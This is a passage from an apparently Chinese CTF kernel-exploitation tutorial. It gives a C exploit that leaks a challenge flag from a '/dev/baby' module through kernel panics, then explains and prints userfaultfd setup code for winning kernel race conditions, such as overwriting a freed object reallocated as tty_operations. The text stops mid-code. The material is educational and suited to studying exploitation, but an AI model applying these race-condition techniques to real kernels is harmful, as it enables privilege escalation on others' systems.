<p>比较需要耐心（因为打远程传文件很麻烦），这里附上一个比较方便的 exp，不用每次打都重新编译一次，只需要将 flag 作为参数传进去就行了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * flag_addr;<br>    <span class="hljs-type">int</span> flag_len;<br>&#125;flag = &#123; .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd, flag_len;<br>    <span class="hljs-type">char</span> * buf, *flag_addr;<br><br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;usage: ./exp flag&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    flag_len = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br><br>    fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    flag_addr = buf + <span class="hljs-number">0x1000</span> - flag_len;<br>    <span class="hljs-built_in">memcpy</span>(flag_addr, argv[<span class="hljs-number">1</span>], flag_len);<br>    flag.flag_addr = flag_addr;<br>    ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>比如说这里的测试 flag 是 <code>flag&#123;THIS_IS_A_FLAG_1234&#125;</code>，如下图所示，我们成功通过 kernel panic 得知 flag 的第一个字符为 <code>T</code></p>
<p><img src="https://i.loli.net/2021/09/08/F1IRZwUh2ix7SGL.png" srcset="/img/loading.gif" lazyload></p>
<p>当然，若是能够优化成纯汇编代码，可执行文件的体积将能够再缩小一个档次，大大降低爆破次数，笔者比较懒，这里便不再给出优化后的汇编代码</p>
<blockquote>
<p>当然，不到万不得已基本上不会用这种累死人的方法</p>
</blockquote>
</blockquote>
<h2 id="userfaultfd（may-obsolete）"><a href="#userfaultfd（may-obsolete）" class="headerlink" title="userfaultfd（may obsolete）"></a><em>userfaultfd（may obsolete）</em></h2><h3 id="userfaultfd-与条件竞争"><a href="#userfaultfd-与条件竞争" class="headerlink" title="userfaultfd 与条件竞争"></a>userfaultfd 与条件竞争</h3><p>严格意义而言 userfaultfd 并非是一种利用手法，<strong>而是 Linux 的一个系统调用</strong>，简单来说，通过 userfaultfd 这种机制，<strong>用户可以通过自定义的 page fault handler 在用户态处理缺页异常</strong></p>
<p>下面的这张图很好地体现了 userfaultfd 的整个流程：</p>
<p><img src="https://i.loli.net/2021/09/08/i4C7oOvHdG2RqUm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>要使用 userfaultfd 系统调用，我们首先要注册一个 userfaultfd，通过 ioctl 监视一块内存区域，同时还需要专门启动一个用以进行轮询的线程 <code>uffd monitor</code>，该线程会通过 <code>poll()</code> 函数不断轮询<strong>直到出现缺页异常</strong></p>
<ul>
<li><p>当有一个线程在这块内存区域内触发缺页异常时（比如说第一次访问一个匿名页），该线程（称之为 faulting 线程）进入到内核中处理缺页异常</p>
</li>
<li><p>内核会调用 <code>handle_userfault()</code> 交由 userfaultfd 处理</p>
</li>
<li><p>随后 faulting 线程进入堵塞状态，同时将一个 <code>uffd_msg</code> 发送给 monitor 线程，等待其处理结束</p>
</li>
<li><p>monitor 线程调用通过 ioctl 处理缺页异常，有如下选项：</p>
<ul>
<li><code>UFFDIO_COPY</code>：将用户自定义数据拷贝到 faulting page 上</li>
<li><code>UFFDIO_ZEROPAGE</code> ：将 faulting page 置0</li>
<li><code>UFFDIO_WAKE</code>：用于配合上面两项中 <code>UFFDIO_COPY_MODE_DONTWAKE</code> 和 <code>UFFDIO_ZEROPAGE_MODE_DONTWAKE</code> 模式实现批量填充</li>
</ul>
</li>
<li><p>在处理结束后 monitor 线程发送信号唤醒 faulting 线程继续工作</p>
</li>
</ul>
<p>以上便是 userfaultfd 这个机制的整个流程，该机制最初被设计来用以进行虚拟机&#x2F;进程的迁移等用途，但是<strong>通过这个机制我们可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高</strong></p>
<p>考虑在内核模块当中有一个菜单堆的情况，其中的操作都没有加锁，那么便存在条件竞争的可能，考虑如下竞争情况：</p>
<ul>
<li>线程1不断地分配与编辑堆块</li>
<li>线程2不断地释放堆块</li>
</ul>
<p>此时线程1便<strong>有可能编辑到被释放的堆块</strong>，若是此时恰好我们又将这个堆块申请到了合适的位置（比如说 tty_operations），那么我们便可以完成对该堆块的重写，从而进行下一步利用</p>
<p>但是毫无疑问的是，若是直接开两个线程进行竞争，命中的几率是比较低的，我们也很难判断是否命中</p>
<p>但假如线程1使用诸如 <code>copy_from_user</code> 、<code>copy_to_user</code> 等方法在用户空间与内核空间之间拷贝数据，那么我们便可以：</p>
<ul>
<li>先用 mmap 分一块匿名内存，为其注册 userfaultfd，由于我们是使用 mmap 分配的匿名内存，此时该块内存并没有实际分配物理内存页</li>
<li>线程1在内核中在这块内存与内核对象间进行数据拷贝，<strong>在访问注册了 userfaultfd 内存时便会触发缺页异常，陷入阻塞，控制权转交 userfaultfd 的 uffd monitor 线程</strong></li>
<li><strong>在 uffd monitor 线程中我们便能对线程1正在操作的内核对象进行恶意操作</strong>（例如覆写线程1正在读写的内核对象，或是将线程1正在读写的内核对象释放掉后再分配到我们想要的地方）</li>
<li>此时再让线程1继续执行，线程 1 便会<strong>向我们想要写入的目标写入特定数据&#x2F;从我们想要读取的目标读取特定数据</strong>了</li>
</ul>
<p>由此，我们便成功利用 userfaultfd 完成了对条件竞争漏洞的利用，这项技术的存在使得条件竞争的命中率大幅提高</p>
<h3 id="userfaultfd-的具体用法"><a href="#userfaultfd-的具体用法" class="headerlink" title="userfaultfd 的具体用法"></a>userfaultfd 的具体用法</h3><blockquote>
<p>以下代码参考自 Linux man page，略有改动</p>
</blockquote>
<p>首先定义接下来需要用到的一些数据结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">long</span> uffd;          <span class="hljs-comment">/* userfaultfd file descriptor */</span><br><span class="hljs-type">char</span> *addr;         <span class="hljs-comment">/* Start of region handled by userfaultfd */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span><br><span class="hljs-type">pthread_t</span> thr;      <span class="hljs-comment">/* ID of thread that handles page faults */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br></code></pre></td></tr></table></figure>

<p>首先通过 userfaultfd 系统调用注册一个 userfaultfd，其中 <code>O_CLOEXEC</code> 和 <code>O_NONBLOCK</code> 和 open 的 flags 相同，笔者个人认为这里可以理解为我们创建了一个虚拟设备 <code>userfault</code></p>
<p>这里用 mmap 分一个匿名页用作后续被监视的区域</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br><span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>uffdio_api.api = UFFD_API;<br>uffdio_api.features = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br><span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">    demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">    actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">    the userfaultfd. */</span><br>len = <span class="hljs-number">0x1000</span>;<br>addr = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>    errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>为这块内存区域注册 userfaultfd</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Register the memory range of the mapping we just created for</span><br><span class="hljs-comment">    handling by the userfaultfd object. In mode, we request to track</span><br><span class="hljs-comment">    missing pages (i.e., pages that have not yet been faulted in). */</span><br><br>uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>uffdio_register.range.len = len;<br>uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br><span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>启动 monitor 轮询线程，整个 userfaultfd 的启动流程就结束了，接下来便是等待缺页异常的过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br><span class="hljs-type">int</span> s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-type">void</span> *) uffd);<br><span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>) &#123;<br>    errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>monitor 轮询线程应当定义如下形式，这里给出的是 UFFD_COPY，即将自定义数据拷贝到 faulting page 上：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> page_size;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>    <span class="hljs-type">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span><br><br>    <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>            errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">        file descriptor */</span><br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>                <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>                (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>                (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-comment">/* We expect only one kind of event; verify that assumption */</span><br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        <span class="hljs-comment">/* Display info about the page-fault event */</span><br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);<br><br>        <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">            region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">            is more obvious that each fault is handled separately. */</span><br><br>        <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>        fault_cnt++;<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br><br>        <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">        So, round faulting address down to page boundary */</span><br><br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,<br>               uffdio_copy.copy);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>有人可能注意到了 <code>uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(page_size - 1);</code> 这个奇怪的句子，在这里作用是将触发缺页异常的地址<strong>按页对齐</strong>作为后续拷贝的起始地址</p>
<blockquote>
<p> 比如说触发的地址可能是 0xdeadbeef，直接从这里开始拷贝一整页的数据就拷歪了，应当从 0xdeadb000 开始拷贝（假设页大小 0x1000）</p>
</blockquote>
<h4 id="例程"><a href="#例程" class="headerlink" title="例程"></a>例程</h4><p>测试例程如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> page_size;<br><br><span class="hljs-type">void</span> <span 